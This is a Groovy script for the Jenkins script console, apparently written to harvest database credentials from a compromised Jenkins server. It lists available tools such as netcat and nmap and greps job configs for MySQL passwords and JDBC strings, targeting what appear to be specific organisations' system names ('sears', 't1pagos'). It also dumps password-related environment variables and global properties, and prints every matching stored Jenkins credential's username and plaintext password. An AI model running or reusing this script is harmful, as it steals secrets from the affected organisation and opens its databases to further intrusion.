println "=== FINDING MYSQL TOOLS + CREDS IN JENKINS ==="

// 1. Check available tools
println "\n--- AVAILABLE TOOLS ---"
["mysql", "mysqldump", "python", "python3", "pip", "pip3", "php", "perl", "ruby", "nc", "ncat", "nmap", "curl", "wget"].each { tool ->
    def proc = "which ${tool}".execute()
    proc.waitForOrKill(3000)
    if (proc.exitValue() == 0) println "  ${tool}: ${proc.text.trim()}"
}

// 2. Check Java classpath for MySQL JDBC
println "\n--- JAVA CLASSPATH (MySQL/MariaDB JARs) ---"
def cp = System.getProperty("java.class.path", "")
cp.split(":").findAll { it.toLowerCase().contains("mysql") || it.toLowerCase().contains("mariadb") }.each {
    println "  ${it}"
}

// 3. Find MySQL JARs in Jenkins plugins
println "\n--- MYSQL JARS IN JENKINS ---"
def findProc = "find /var/jenkins_home -name '*mysql*.jar' -o -name '*mariadb*.jar' 2>/dev/null".execute()
findProc.waitForOrKill(5000)
println findProc.text.take(1000)

// 4. Search for DB creds in Jenkins config files
println "\n--- DB CREDENTIALS IN JENKINS CONFIGS ---"
def grepProc = "grep -r -l -i 'mysql\\|jdbc\\|database.*password\\|db_pass\\|DB_HOST' /var/jenkins_home/jobs/ --include='*.xml' --include='*.properties' --include='*.yml' --include='*.yaml' --include='*.env' 2>/dev/null".execute()
grepProc.waitForOrKill(10000)
def files = grepProc.text.trim().split('\n').findAll { it.trim() }
println "Files with DB references: ${files.size()}"
files.take(20).each { println "  ${it}" }

// 5. Search for DB creds in specific patterns
println "\n--- SEARCHING SENSITIVE PATTERNS ---"
def searchPatterns = [
    "grep -r -i 'DB_HOST\\|DB_PASS\\|MYSQL_ROOT\\|MYSQL_PASS' /var/jenkins_home/jobs/ --include='*.xml' 2>/dev/null | head -30",
    "grep -r -i 'jdbc:mysql' /var/jenkins_home/ --include='*.xml' --include='*.properties' --include='*.groovy' 2>/dev/null | head -20",
    "grep -r -i 'dbasears\\|t1pagos\\|mrc-services' /var/jenkins_home/ 2>/dev/null | head -20",
]

searchPatterns.each { cmd ->
    def p = ['bash', '-c', cmd].execute()
    p.waitForOrKill(10000)
    def out = p.text.trim()
    if (out) {
        println "\n${cmd.split(' ')[1..2].join(' ')}:"
        println out
    }
}

// 6. Check environment variables
println "\n--- ENVIRONMENT VARIABLES (DB related) ---"
System.getenv().findAll { k, v ->
    k.toLowerCase().contains('db') || k.toLowerCase().contains('mysql') || 
    k.toLowerCase().contains('redis') || k.toLowerCase().contains('jdbc') ||
    k.toLowerCase().contains('pass') || k.toLowerCase().contains('host') ||
    k.toLowerCase().contains('database') || k.toLowerCase().contains('sears')
}.each { k, v ->
    println "  ${k}=${v}"
}

// 7. Jenkins global environment variables
println "\n--- JENKINS GLOBAL PROPERTIES ---"
def jenkins = Jenkins.getInstance()
def gp = jenkins.getGlobalNodeProperties()
gp.each { p ->
    if (p instanceof hudson.slaves.EnvironmentVariablesNodeProperty) {
        p.getEnvVars().each { k, v ->
            println "  ${k}=${v}"
        }
    }
}

// 8. Check Jenkins credentials for DB entries
println "\n--- JENKINS CREDENTIALS (DB related) ---"
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    jenkins,
    null,
    null
)
creds.each { c ->
    def desc = c.getDescription() ?: ""
    def id = c.getId() ?: ""
    if (desc.toLowerCase().contains('db') || desc.toLowerCase().contains('mysql') ||
        desc.toLowerCase().contains('sears') || desc.toLowerCase().contains('t1') ||
        id.toLowerCase().contains('db') || id.toLowerCase().contains('mysql')) {
        println "  ID: ${id}"
        println "  Desc: ${desc}"
        if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
            println "  User: ${c.getUsername()}"
            println "  Pass: ${c.getPassword()}"
        }
        println "  ---"
    }
}

println "\n=== SEARCH DONE ==="
